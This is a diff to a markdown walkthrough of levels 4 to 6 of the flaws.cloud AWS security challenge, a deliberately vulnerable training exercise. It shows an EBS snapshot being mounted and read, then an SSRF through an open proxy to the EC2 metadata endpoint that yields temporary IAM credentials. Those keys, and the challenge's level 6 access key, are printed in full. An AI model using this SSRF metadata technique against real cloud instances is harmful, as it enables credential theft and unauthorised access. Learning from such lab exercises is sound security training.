@@ -176,9 +176,27 @@ $ aws ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone
 ```
 Then create a new EC2 instance in the same region and attach the volume to it. For this part, I just used the AWS Console as it was more intuitive. 
 
-Afterwards, we need to SSH to the instance and mount the volume:
+Afterwards, SSH to the instance to mount the volume. The fastest way is to just use EC2 Instance Connect.
 ```sh
+$ lsblk
+NAME      MAJ:MIN   RM SIZE RO TYPE MOUNTPOINTS
+xvda      202:0      0   8G  0 disk
+├─xvda1   202:1      0   8G  0 part /
+├─xvda127 259:0      0   1M  0 part
+└─xvda128 259:1      0  10M  0 part /boot/efi
+xvdbc     202:13824  0   8G  0 disk
+└─xvdbc1  202:13825  0   8G  0 part
 
+$ sudo mount /dev/xvdbc1 /mnt
+
+$ lsblk
+NAME      MAJ:MIN   RM SIZE RO TYPE MOUNTPOINTS
+xvda      202:0      0   8G  0 disk
+├─xvda1   202:1      0   8G  0 part /
+├─xvda127 259:0      0   1M  0 part
+└─xvda128 259:1      0  10M  0 part /boot/efi
+xvdbc     202:13824  0   8G  0 disk
+└─xvdbc1  202:13825  0   8G  0 part /mnt
 ```
 
 The following command was then used to traverse through the /mnt/ directory to find any file containing 'nginx' in its name:
@@ -207,5 +225,56 @@ $ dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
 ec2-54-202-228-246.us-west-2.compute.amazonaws.com. 5 IN A 54.202.228.246
 ```
 
-- The main challenge of this level was figuring out how to read the contents of the snapshot (turns out you can't) / exploiting it. I ended up stumbling upon this [article](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump) which ultimately helped me solve this level.
+- The main challenge of this level was figuring out how to read the contents of the snapshot (you can't) / exploiting it. I ended up stumbling upon this [article](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump) which ultimately helped me solve this level.
+
+## Level 5
+**_Description:_** This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage: 
+<ul>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</ul>
+<ul>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</ul>
+<ul>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</ul>
+See if you can use this proxy to figure out how to list the contents of the level6 bucket at ```level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud``` that has a hidden directory in it.
+
+In AWS, EC2 instance metadata provides comprehensive information on the instance. Notably, it also contains the credentials of the IAM role assigned to the instance. This information can be accessed by making a [request](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html#instance-metadata-retrieval-examples-imdsv1) from the instance to the following URL: ```http://169.254.169.254/latest/meta-data/```.
+
+For this level, the EC2 acts as a proxy and sends a request to the addresses that is specified after /proxy. We can try constructing a URL to make the instance request its own metadata:
+```
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
+```
+Success! This returns a list of directories we can access. Particularly, there is an IAM directory that may contain useful information. Further traversing this directory, we find temporary credentials for an IAM role called **flaws**:
+```
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+```
+```sh
+{
+  "Code" : "Success",
+  "LastUpdated" : "2025-01-01T12:48:01Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA6GG7PSQGRM7W7MVK",
+  "SecretAccessKey" : "2RCcR3NB2Xa3pjRhy40FBRiIoQGMCaxlnTykEE8V",
+  "Token" : "IQoJb3JpZ2luX2VjEOX//////////wEaCXVzLXdlc3QtMiJHMEUCIQDhc9nTo9OqePS16bFkCahvNmk9wZOzc0LzN8/dAcowrQIgeOK6Mvs8fRYW1G8iEy38R73r543M8lH6znAOYo9Vr2cquwUIvv//////////ARAEGgw5NzU0MjYyNjIwMjkiDPSxm2ZvPX0eX7wUriqPBT0nJREXo+eFlrWZO+gMUVJT27fDofXW0v8uB6KycbjbDARKBWKjrq139StQp3Zh8qCdWoVAXOsoLOIGIgydB598P7qtt5jA0OcDfEYLoEt7AdBjJHiblW+RhtJF5wTlcNEA4wzAw6SMvNeXrNKDLYeFCNEo8KyBaH/qL17Zm+aMhIznznE2rhjeIYvPRIRY3AbCzRp3a2CwD5Muf4NjHuflD+agOgukkxJwTxs85RDHNe/7uHdAi1WIAuOQQMNIWedxztzMyU1PwtQC2L6cQttCTTOfR/W2idAkQSRoBo3waMw3Xq20GUTheaaP7XArb2QVkfP3qGDSz8MSCe4NnpwcDvqSVlt+r4jkAAOjo92PP4jOnbKWEBnZBRsSWO45JB1Q8wIvBRHocGOVGULzdfAE7Vm9/1dfPjAN9Vdu6ldKvyJQTEFV3lxuJY3iuKUqCvA+xxRE8YhcdhJ8gc1A+IPAh9dc+Nbqb9vRQt4xtfDvYQ8pR/JcxBScR005kuF03j3wWDFFCNVH28F4ls6fNcY3VGdz6Q7HbARTCMF/tUuM3HNEqid3fwmAGeqG8hVMmpBO1UoRB+WqBzQu/DppKso37Rqt0y0XSMszbVeq2ODh79lGtuUG0wZ6zIZRTeJ050qvzjh+JWYQ7a5GRXBUIfLQMXP8WZdjHAXeKzvK5b7dxaGvCY2zbMeui4cIIOUZFb2KfIW6iVgIL+jPnmYdPHCaCSWt7ySiYx9jsi6mHFGOFe+zpRC4drcJ4gifBBBVbOd41KdAGkeCRUbuS5g8yDtlcq7mVQR1/baeNBP1zFuk6LGCqn0zZF//3jxAbkMvBxQuD6Dnd+BFw1l0fC9bga36Ymb7scWLI+3qRvAoPkUwlPPUuwY6sQEzcz3JA7HhSvzlkgmXY1TaNdIbvxMFnkNICx5cH+hO0IiLIQ0YPbY4D0OJ2KD6m6RES4gmI3WhYxxuQm+Qp7hYS6Bd5OcJoXBqVaN5yFDypKI8+6srnu4i1iSrX/j5QRFlOIoNHYxuAboB5QaambWN47rVKgk0xeVfiRdNF3in5bogiB1l62KtSCvcselVcjqeoKASK3eUyK0kf9HWPtkpD9wvaLnLtexotU6FsbS5eyc=",
+  "Expiration" : "2025-01-01T19:16:06Z"
+}
+```
+
+These credentials can be used to create a new profile and list the contents of the level 6 bucket:
+```sh
+$aws --profile lvl5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/                                                                         PRE ddcc78ff/                                                                                                    2017-02-27 13:11:07        871 index.html
+```
+Link to level 6:
+```sh
+http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
+```
+
+#### Note(s): 
+Initially, I configured a new profile using only the access and secret keys. However, this resulted in InvalidAccessKeyId error when I tried listing the bucket. I had to also include the provided session token by doing:
+```sh
+aws configure --profile lvl5 set aws_session_token [TOKEN]
+```
+
+## Level 6
+**_Description:_** For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. <br>
+```
+Access key ID: AKIAJFQ6E7BY57Q3OBGA
+Secret: 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
+```
 
